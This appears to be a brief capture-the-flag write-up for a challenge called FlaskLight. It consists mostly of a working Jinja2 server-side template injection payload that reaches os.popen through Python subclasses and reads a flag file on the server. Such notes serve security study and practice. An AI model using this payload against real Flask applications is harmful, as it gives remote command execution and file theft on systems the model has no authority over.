## FlaskLight

![](attachments/Pasted%20image%2020240405083918.png)

ssti

![](attachments/Pasted%20image%2020240405084017.png)

```
?search={%for(x)in().__class__.__base__.__subclasses__()%}{%if'war'in(x).__name__ %}{{x()._module.__builtins__['__import__']('os').popen('cat /flasklight/coomme_geeeett_youur_flek').read()}}{%endif%}{%endfor%}
```